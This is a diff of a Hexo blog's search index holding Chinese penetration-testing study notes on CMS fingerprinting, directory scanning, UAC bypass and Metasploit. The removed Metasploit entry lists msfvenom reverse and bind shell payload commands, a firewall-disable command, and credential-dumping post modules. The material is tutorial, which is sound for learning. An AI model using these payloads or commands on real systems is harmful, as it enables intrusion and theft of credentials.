+<li><a href="https://blog.szfszf.top/tech/dedecms-%e6%9c%80%e6%96%b0%e7%89%88%e6%bc%8f%e6%b4%9e%e6%94%b6%e9%9b%86%e5%b9%b6%e5%a4%8d%e7%8e%b0%e5%ad%a6%e4%b9%a0/" target="_blank" rel="noopener">https://blog.szfszf.top/tech/dedecms-%e6%9c%80%e6%96%b0%e7%89%88%e6%bc%8f%e6%b4%9e%e6%94%b6%e9%9b%86%e5%b9%b6%e5%a4%8d%e7%8e%b0%e5%ad%a6%e4%b9%a0/</a></li>
+<li><a href="https://xz.aliyun.com/t/4150" target="_blank" rel="noopener">https://xz.aliyun.com/t/4150</a> (图片马没执行换个小点的图片试试)</li>
+</ul>
+<h1 id="empireCMS（帝国）"><a href="#empireCMS（帝国）" class="headerlink" title="empireCMS（帝国）"></a>empireCMS（帝国）</h1><ul>
+<li><a href="https://www.cnblogs.com/yuzly/p/11369770.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11369770.html</a></li>
+<li><a href="https://www.cnblogs.com/yuzly/p/11359925.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11359925.html</a></li>
+</ul>
+<h1 id="PHPCMS"><a href="#PHPCMS" class="headerlink" title="PHPCMS"></a>PHPCMS</h1><ul>
+<li>安装的时候DNS解析要修改，install\install.php 49行的URL改成<a href="http://www.baidu.com或者其他能访问的域名" target="_blank" rel="noopener">www.baidu.com或者其他能访问的域名</a></li>
+<li><a href="https://www.hackersb.cn/hacker/219.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/219.html</a><ul>
+<li>用户名每次需要更改</li>
+<li>远程服务器的一句话，如果要让目标服务器下载，是不能让这个文件被解析的。可以在没有安装php的服务器上上传一个php一句话让目标访问就能下载。</li>
+</ul>
+</li>
+</ul>
+<h1 id="discuz"><a href="#discuz" class="headerlink" title="discuz"></a>discuz</h1><ul>
+<li>现在修复了很多。具体可以去搜以前的资料</li>
 </ul>
 ]]></content>
       <tags>
-        <tag>sql注入</tag>
+        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -1110,52 +1348,6 @@
 ]]></content>
       <tags>
         <tag>getshell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>基于CMS的渗透</title>
-    <url>/2020/02/22/%E5%9F%BA%E4%BA%8ECMS%E7%9A%84%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<h1 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
-<li>通过某项特征来识别，获得网站某个文件的MD5或者用正则表达式与字典里面的关键字进行匹配，如果匹配成功就说明这个站点是对应的CMS。</li>
-</ul>
-<h2 id="国内在线指纹识别"><a href="#国内在线指纹识别" class="headerlink" title="国内在线指纹识别"></a>国内在线指纹识别</h2><ul>
-<li>云悉：<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></li>
-<li>潮汐：<a href="http://finger.tidesec.net/" target="_blank" rel="noopener">http://finger.tidesec.net/</a></li>
-<li>who am i ：<a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/</a></li>
-</ul>
-<h2 id="国外在线指纹识别"><a href="#国外在线指纹识别" class="headerlink" title="国外在线指纹识别"></a>国外在线指纹识别</h2><ul>
-<li><a href="https://whatcms.org/" target="_blank" rel="noopener">https://whatcms.org/</a></li>
-<li><a href="https://cmsdetect.com/" target="_blank" rel="noopener">https://cmsdetect.com/</a></li>
-<li><a href="https://itrack.ru/whatcms/" target="_blank" rel="noopener">https://itrack.ru/whatcms/</a></li>
-</ul>
-<h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><ul>
-<li>robots.txt</li>
-<li>404报错</li>
-<li>….</li>
-</ul>
-<h1 id="如何渗透"><a href="#如何渗透" class="headerlink" title="如何渗透"></a>如何渗透</h1><p>因为这些cms都是开源的，安全工作者就会对这些源代码进审计（代码审计），很多CMS就会被爆出各种漏洞及其利用方式，我们只要把相应的请求发到到目标网站，就可成功利用。在搜索引擎上搜索相应漏洞即可。</p>
-<h1 id="DEDECMS（织梦）"><a href="#DEDECMS（织梦）" class="headerlink" title="DEDECMS（织梦）"></a>DEDECMS（织梦）</h1><ul>
-<li><a href="https://blog.szfszf.top/tech/dedecms-%e6%9c%80%e6%96%b0%e7%89%88%e6%bc%8f%e6%b4%9e%e6%94%b6%e9%9b%86%e5%b9%b6%e5%a4%8d%e7%8e%b0%e5%ad%a6%e4%b9%a0/" target="_blank" rel="noopener">https://blog.szfszf.top/tech/dedecms-%e6%9c%80%e6%96%b0%e7%89%88%e6%bc%8f%e6%b4%9e%e6%94%b6%e9%9b%86%e5%b9%b6%e5%a4%8d%e7%8e%b0%e5%ad%a6%e4%b9%a0/</a></li>
-<li><a href="https://xz.aliyun.com/t/4150" target="_blank" rel="noopener">https://xz.aliyun.com/t/4150</a> (图片马没执行换个小点的图片试试)</li>
-</ul>
-<h1 id="empireCMS（帝国）"><a href="#empireCMS（帝国）" class="headerlink" title="empireCMS（帝国）"></a>empireCMS（帝国）</h1><ul>
-<li><a href="https://www.cnblogs.com/yuzly/p/11369770.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11369770.html</a></li>
-<li><a href="https://www.cnblogs.com/yuzly/p/11359925.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuzly/p/11359925.html</a></li>
-</ul>
-<h1 id="PHPCMS"><a href="#PHPCMS" class="headerlink" title="PHPCMS"></a>PHPCMS</h1><ul>
-<li>安装的时候DNS解析要修改，install\install.php 49行的URL改成<a href="http://www.baidu.com或者其他能访问的域名" target="_blank" rel="noopener">www.baidu.com或者其他能访问的域名</a></li>
-<li><a href="https://www.hackersb.cn/hacker/219.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/219.html</a><ul>
-<li>用户名每次需要更改</li>
-<li>远程服务器的一句话，如果要让目标服务器下载，是不能让这个文件被解析的。可以在没有安装php的服务器上上传一个php一句话让目标访问就能下载。</li>
-</ul>
-</li>
-</ul>
-<h1 id="discuz"><a href="#discuz" class="headerlink" title="discuz"></a>discuz</h1><ul>
-<li>现在修复了很多。具体可以去搜以前的资料</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -1333,45 +1525,42 @@
       </tags>
   </entry>
   <entry>
-    <title>windows提权之UAC绕过</title>
-    <url>/2020/02/27/windows%E6%8F%90%E6%9D%83%E4%B9%8BUAC%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><ul>
-<li>用户账户控制，是Windows Vista及更高版本操作系统中采用的一种控制机制。</li>
-<li>一旦程序设计系统更改或是特定任务，除非以管理员权限运行，否则这些操作都将被阻止，没有管理员权限将不能进行以下操作：<ul>
-<li>注册表修改</li>
-<li>加载设备驱动程序</li>
-<li>DLL注入</li>
-<li>修改系统时间</li>
-<li>修改用户账户控制</li>
-<li>修改受保护的目录</li>
-<li>计划任务</li>
+    <title>目录扫描</title>
+    <url>/2020/02/20/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/</url>
+    <content><![CDATA[<h1 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h1><ul>
+<li>找到有价值的页面信息<ul>
+<li>上传</li>
+<li>后台</li>
+<li>网站信息（phpinfo、源码备份、说明文档…）</li>
 </ul>
 </li>
-<li>参考文章：<a href="https://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/" target="_blank" rel="noopener">https://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/</a></li>
 </ul>
-<h1 id="用msf绕过UAC限制"><a href="#用msf绕过UAC限制" class="headerlink" title="用msf绕过UAC限制"></a>用msf绕过UAC限制</h1><p>利用以下模块：search bypassuac</p>
-<ul>
-<li>exploit/windows/local/bypassuac </li>
-<li>exploit/windows/local/bypassuac_comhijack </li>
-<li>exploit/windows/local/bypassuac_eventvwr</li>
-<li>exploit/windows/local/bypassuac_fodhelper</li>
-<li>exploit/windows/local/bypassuac_injection</li>
-<li>exploit/windows/local/bypassuac_injection_winsxs </li>
-<li>exploit/windows/local/bypassuac_silentcleanup </li>
-<li>exploit/windows/local/bypassuac_sluihijack </li>
-<li>exploit/windows/local/bypassuac_vbs</li>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ul>
+<li>提交请求（GET、HEAD)，查看返回包信息（状态码等）</li>
 </ul>
-<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><ol>
-<li>获得session以后，先background把会话放到后台</li>
-<li>然后use bypassuac的模块</li>
-<li>set session id</li>
-<li>exploit以后会创建一个新的session</li>
-<li>session id+1 </li>
-</ol>
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul>
+<li>Windows：御剑、7kbscan-WebPathBrute、DirBuster、PmWebDirScan、burp suite</li>
+<li>Linux：DirBuster、PmWebDirScan、burp suite</li>
+</ul>
+<h1 id="找后台办法"><a href="#找后台办法" class="headerlink" title="找后台办法"></a>找后台办法</h1><ul>
+<li>穷举猜解（用字典）</li>
+<li>开源类程序、常见CMS。根据源码猜解</li>
+<li>搜索引擎（google hacking）</li>
+<li>二级域名</li>
+<li>其他端口</li>
+<li>盲打，插张自己服务器上的远程图片，看referer来自哪里。</li>
+<li>站点备份。www、wwwroot、web开头，rar、7z、zip结尾</li>
+<li>其他文件。readme.txt，css和js文件</li>
+<li>还找不到，那算了，从别的思路走，比如旁站，c段。</li>
+</ul>
+<h1 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h1><ul>
+<li>site:</li>
+<li>inurl:</li>
+<li>intittle:</li>
+</ul>
 ]]></content>
       <tags>
-        <tag>提权</tag>
-        <tag>msf</tag>
+        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
@@ -1424,195 +1613,6 @@
 ]]></content>
       <tags>
         <tag>基础学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>msf的七个模块</title>
-    <url>/2020/02/26/msf%E7%9A%84%E4%B8%83%E4%B8%AA%E6%A8%A1%E5%9D%97/</url>
-    <content><![CDATA[<h1 id="七个模块"><a href="#七个模块" class="headerlink" title="七个模块"></a>七个模块</h1><p>模块都是用use命令使用，用info查看模块详细信息。show options查看配置信息。search搜索模块。</p>
-<ol>
-<li><p>exploit</p>
-<p>漏洞利用模块。对漏洞进行利用。</p>
-<ul>
-<li>使用方法：use 模块名，show target 查看模块支持的目标环境</li>
-<li>先对目标进行扫描，能够利用再执行攻击模块</li>
-<li>反弹回的是cmdshell可以更改payload返回一个meterpreter</li>
-</ul>
-</li>
-<li><p>payloads</p>
-<p>攻击载荷模块。可以执行反弹代码，添加用户等攻击。</p>
-<ol>
-<li><p>正向payload：会被防火墙拦截</p>
-<ul>
-<li><p>攻击者去连接目标服务器</p>
-</li>
-<li><p>使用场景：</p>
-<ul>
-<li>目标及其不给其他除特定端口外的端口出站</li>
-<li>目标处于深层网络，不能直接连通外网，其他机器开了防火墙，也不能通过其他机器连通，通过开着防火墙的机器端口转发达到穿透目的</li>
-</ul>
-</li>
-<li><p>案例：</p>
-<p>关闭防火墙：netsh firewall set opmode mode=disable</p>
-<ul>
-<li>msfvenom -p windows/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f exe &gt; /root/bind_xx.exe</li>
-<li>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f exe &gt;  /root/bind_xx.exe</li>
-<li>msfvenom -p windows/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f dll &gt; /root/bind_xx.dll</li>
-<li>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f dll &gt; /root/bind_xx.dll</li>
-<li>msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f elf &gt; /root/bind_xx.elf</li>
-<li>msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=&lt;Attack Port&gt; -f elf &gt; /root/bind_xx.elf</li>
-</ul>
-</li>
-<li><p>连接：</p>
-<p>use exploit/multi/handler</p>
-<p>set payload windows/meterpreter/bind_tcp</p>
-<p>set rhost &lt;Attack IP&gt;</p>
-<p>exploit</p>
-</li>
-</ul>
-</li>
-<li><p>反向payload：只要免杀，端口填常用的80,，8080，443，53端口，可以穿透防火墙。</p>
-<ul>
-<li><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your<br>Port to Connect On&gt; -f exe &gt; shell.exe</p>
-<p>cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘n’&gt; shell.php &amp;&amp; pbpaste &gt;&gt;<br>shell.php</p>
-</li>
-<li><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your<br>Port to Connect On&gt; -f elf &gt; shell.elf</p>
-</li>
-<li><p>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f macho &gt; shell.macho</p>
-<p>webshell</p>
-</li>
-<li><p>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port<br>to Connect On&gt; -f raw &gt; shell.php</p>
-</li>
-<li><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your<br>Port to Connect On&gt; -f asp &gt; shell.asp</p>
-</li>
-<li><p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f raw\ &gt; shell.jsp</p>
-</li>
-<li><p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f war &gt; shell.war</p>
-</li>
-<li><p>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f raw &gt; shell.py</p>
-</li>
-<li><p>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f raw &gt; shell.sh</p>
-</li>
-<li><p>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f raw &gt; shell.pl</p>
-</li>
-<li><p>msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&lt;Your IP Address&gt; LPORT=<br>&lt;Your Port to Connect On&gt; -f psh &gt; shell.ps1<br>powershell.exe -ExecutionPolicy Bypass -File shell.ps1</p>
-</li>
-<li><p>msf接收：</p>
-<p>use exploit/multi/handler</p>
-<p>set PAYLOAD windows/meterpreter/reverse_tcp</p>
-<p>set LHOST 192.168.88.128</p>
-<p>set LPORT 4444</p>
-<p>set ExitOnSession false</p>
-<p>exploit -j -z</p>
-</li>
-<li><p>多个连接，用background放到后台，sessions查看存活的</p>
-</li>
-</ul>
-</li>
-</ol>
-</li>
-<li><p>auxiliary</p>
-<p>辅助模块。有端口扫描，存活探测，暴力破解等功能。</p>
-<p>常用模块：</p>
-<ul>
-<li><p>端口扫描</p>
-<p>auxiliary/scanner/portscan/ack //ACK防火墙扫描<br>auxiliary/scanner/portscan/ftpbounce //FTP跳端口扫描<br>auxiliary/scanner/portscan/syn //SYN端口扫描<br>auxiliary/scanner/portscan/tcp //TCP端口扫描<br>auxiliary/scanner/portscan/xmas //TCP-XMas端口扫描</p>
-</li>
-<li><p>版本扫描</p>
-<p>auxiliary/scanner/smb/smb_version<br>auxiliary/scanner/mssql/mssql_version<br>……</p>
-</li>
-<li><p>登录爆破</p>
-<p>auxiliary/scanner/mssql/mssql_login<br>auxiliary/scanner/smb/smb_login</p>
-</li>
-<li><p>其他</p>
-<p>auxiliary/scanner/mssql/mssql_hashdump //dump密码hash<br>auxiliary/scanner/smb/smb_ms17_010</p>
-</li>
-<li><p>注：</p>
-<p>set rhosts file:/root/ips.txt。批量设置目标ip</p>
-<p>​</p>
-</li>
-</ul>
-</li>
-<li><p>post</p>
-<p>后渗透模块。一般用于内网渗透。在meterpreter里面就可以使用</p>
-<p>run post/windows/gather/hashdump 获取密码hash，权限不够可以通过提权以后进行进程迁移。<br>run post/windows/gather/smart_hashdump<br>run post/multi/recon/local_exploit_suggester  提权<br>run post/multi/gather/firefox_creds<br>run post/multi/gather/ssh_creds<br>run post/windows/gather/enum_applications</p>
-</li>
-<li><p>encoders</p>
-<p>编码器模块。对payload进行编码加密，绕过杀软。</p>
-</li>
-<li><p>evasion</p>
-<p>躲避模块。躲避限制和杀软，免杀效果一般。</p>
-</li>
-<li><p>nops</p>
-<p>空指令模块。用以产生缓冲区填充的非操作性指令。</p>
-</li>
-</ol>
-<h1 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h1><h2 id="安装postgresql"><a href="#安装postgresql" class="headerlink" title="安装postgresql"></a>安装postgresql</h2><ul>
-<li>apt-get install postgresql -y</li>
-</ul>
-<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul>
-<li><p>修改postgres系统用户密码</p>
-<p>echo “postgres:password” | chpasswd</p>
-</li>
-<li><p>修改数据库默认用户postgres密码</p>
-<p>su postgres</p>
-<p>psql</p>
-<p>\password postgres</p>
-<p>\q</p>
-<p>exit</p>
-</li>
-<li><p>进入msfconsole后连接</p>
-<p>db_connect postgres:<a href="mailto:password@127.0.0.1">password@127.0.0.1</a>/msfdb</p>
-</li>
-<li><p>creds命令查看记录</p>
-</li>
-</ul>
-<h2 id="快捷连接"><a href="#快捷连接" class="headerlink" title="快捷连接"></a>快捷连接</h2><ul>
-<li>把 db_connect postgres:<a href="mailto:password@127.0.0.1">password@127.0.0.1</a>/msfdb 保存为文件connection.rc</li>
-<li>msfconsole -r connection.rc</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>msf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>目录扫描</title>
-    <url>/2020/02/20/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/</url>
-    <content><![CDATA[<h1 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h1><ul>
-<li>找到有价值的页面信息<ul>
-<li>上传</li>
-<li>后台</li>
-<li>网站信息（phpinfo、源码备份、说明文档…）</li>
-</ul>
-</li>
-</ul>
-<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ul>
-<li>提交请求（GET、HEAD)，查看返回包信息（状态码等）</li>
-</ul>
-<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ul>
-<li>Windows：御剑、7kbscan-WebPathBrute、DirBuster、PmWebDirScan、burp suite</li>
-<li>Linux：DirBuster、PmWebDirScan、burp suite</li>
-</ul>
-<h1 id="找后台办法"><a href="#找后台办法" class="headerlink" title="找后台办法"></a>找后台办法</h1><ul>
-<li>穷举猜解（用字典）</li>
-<li>开源类程序、常见CMS。根据源码猜解</li>
-<li>搜索引擎（google hacking）</li>
-<li>二级域名</li>
-<li>其他端口</li>
-<li>盲打，插张自己服务器上的远程图片，看referer来自哪里。</li>
-<li>站点备份。www、wwwroot、web开头，rar、7z、zip结尾</li>
-<li>其他文件。readme.txt，css和js文件</li>
-<li>还找不到，那算了，从别的思路走，比如旁站，c段。</li>
-</ul>
-<h1 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h1><ul>
-<li>site:</li>
-<li>inurl:</li>
-<li>intittle:</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>信息收集</tag>
       </tags>
   </entry>
   <entry>
